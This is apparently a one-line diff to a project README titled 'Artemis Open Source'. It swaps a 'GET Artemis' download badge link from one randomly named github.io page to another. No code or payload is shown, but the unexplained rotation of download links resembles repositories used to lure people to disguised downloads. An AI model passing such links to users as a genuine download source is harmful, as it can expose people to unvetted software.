@@ -1,6 +1,6 @@
 # Artemis Open Source - Developer Repository and Software Project
 
-[![GET Artemis](https://img.shields.io/badge/GET%20%E2%80%94%20Artemis-0078D6?style=for-the-badge&logoColor=white)](https://kingsleywilcoxkril.github.io/.github/artemis-open-source)
+[![GET Artemis](https://img.shields.io/badge/GET%20%E2%80%94%20Artemis-0078D6?style=for-the-badge&logoColor=white)](https://omariaguilarvfii.github.io/.github/artemis-open-source)
 
 ## Overview of the Artemis Project
 
